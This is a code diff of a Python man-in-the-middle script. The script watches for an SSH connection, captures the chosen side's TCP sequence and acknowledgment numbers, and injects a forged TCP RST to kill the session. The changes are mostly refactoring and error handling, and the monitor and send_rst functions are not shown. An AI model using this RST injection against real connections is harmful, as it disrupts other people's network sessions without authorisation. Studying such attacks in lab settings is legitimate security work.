@@ -13,8 +13,8 @@ def choose_target():
             return "SERVER"
         if choice == "2":
             return "CLIENT"
-
         print("Invalid choice. Enter 1 or 2.")
+
 
 def main():
     print("[*] Starting MITM TCP monitor...")
@@ -23,23 +23,28 @@ def main():
     monitor.start()
 
     print("[*] Waiting for SSH connection...")
-
-    # Wait until connection is stable
     monitor.wait_for_stability()
     print("\n[*] Connection is stable.")
 
     target = choose_target()
-    state = monitor.get_state(target)
+
+    try:
+        state = monitor.get_state(target)
+    except RuntimeError as e:
+        print(f"[!] {e}")
+        return
+
+    print("\n[+] RST state to inject:")
+    for k, v in state.items():
+        print(f"    {k}: {v}")
 
     send_rst(
         state["source_ip"],
         state["source_port"],
-
         state["destination_ip"],
         state["destination_port"],
-
         state["seq"],
-        state["ack"]
+        state["ack"],
     )
 
 
